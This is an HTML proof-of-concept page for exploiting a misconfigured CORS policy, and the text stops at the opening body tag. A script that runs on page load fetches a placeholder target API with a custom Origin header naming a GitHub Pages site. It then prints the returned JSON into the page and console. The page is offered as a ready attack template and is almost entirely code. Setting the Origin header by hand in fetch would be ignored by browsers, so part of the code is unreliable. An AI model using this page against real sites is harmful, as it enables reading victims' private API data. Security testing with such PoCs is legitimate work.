<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CORS Exploitation PoC</title>
  <script>
    window.onload = function() {
      // Change this to the target URL that is vulnerable to open CORS
      const vulnerableApiUrl = 'URL of application With Vulnerable CORS'; 
      
      // Send a fetch request with the Origin header set to your GitHub Pages URL
      fetch(vulnerableApiUrl, {
        method: 'GET',
        headers: {
          'Origin': 'https://pangorrohammer.github.io/CORS/'
        }
      })
      .then(response => response.json())
      .then(data => {
        // Log the response to the console
        console.log('Exploited CORS response:', data);
        document.getElementById('result').textContent = JSON.stringify(data);
      })
      .catch(error => {
        console.error('Error during CORS request:', error);
        document.getElementById('result').textContent = 'Error during CORS request';
      });
    }
  </script>
</head>
<body>
